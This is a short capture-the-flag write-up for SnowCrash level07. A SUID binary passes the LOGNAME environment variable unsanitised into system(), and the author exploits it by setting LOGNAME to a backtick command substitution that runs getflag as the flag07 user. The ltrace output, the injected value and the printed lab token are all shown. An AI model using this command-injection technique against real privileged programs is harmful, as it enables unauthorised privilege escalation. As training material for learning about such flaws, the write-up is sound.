In home directory tere is executable file with SUID bit:
```shell
level07@SnowCrash:~$ ls -la
[...]
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
```
Runing ltrace shows that file calls <getenv("LOGNAME")> and print the result
```shell
level07@SnowCrash:~$ ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff6e4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                          = 2007
geteuid()                                                                          = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                = 0
getenv("LOGNAME")                                                                  = "level07"
asprintf(0xbffff634, 0x8048688, 0xbfffff1e, 0xb7e5ee55, 0xb7fed280)                = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                             = 0
+++ exited (status 0) +++
```
So I can change value of env "LOGNAME" and call getflag from user flag07:
```shell
level07@SnowCrash:~$ export LOGNAME='echo `getflag`'
level07@SnowCrash:~$ env | grep LOGNAME
LOGNAME=echo `getflag`
level07@SnowCrash:~$ ./level07 
echo Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```